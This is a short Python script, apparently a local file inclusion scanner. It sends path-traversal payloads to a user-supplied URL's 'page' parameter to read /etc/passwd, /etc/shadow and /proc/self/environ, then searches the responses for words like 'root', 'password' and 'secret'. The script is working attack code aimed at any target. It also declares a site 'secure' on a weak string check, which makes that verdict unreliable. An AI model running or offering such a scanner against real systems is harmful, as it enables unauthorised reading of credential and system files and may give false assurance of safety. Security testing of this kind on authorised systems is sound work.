import requests

class LFI_VulnerabilityChecker:
    def __init__(self):
        self.url = input("Target URL: ")

    def check_vulnerability(self):
        if "page=" in self.url:
            print("\nTarget matches LFI parameters. Commencing request!")
            self.send_request()
        else:
            print("\nTarget does not match LFI parameters. Please try again.")
            return

    def send_request(self):
        payloads = [
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "../../../../../../../../../../../../../etc/passwd",
        ]

        for payload in payloads:
            response = requests.get(self.url, params={"page": payload})
            self.filter_output(response.text, payload)

    def filter_output(self, output, payload):
        if "/bin/" in output or "/home/" in output:
            print(f"\nTarget may be vulnerable! Payload: {payload}")
            self.check_additional_signs(output)
        else:
            print(f"\nTarget is secure for payload: {payload}")

    def check_additional_signs(self, output):
        dangerous_signs = [
            "root",
            "admin",
            "password",
            "secret",
            "database",
        ]

        for sign in dangerous_signs:
            if sign in output:
                print(f"Potential dangerous sign found: {sign}")

if __name__ == '__main__':
    checker = LFI_VulnerabilityChecker()
    checker.check_vulnerability()
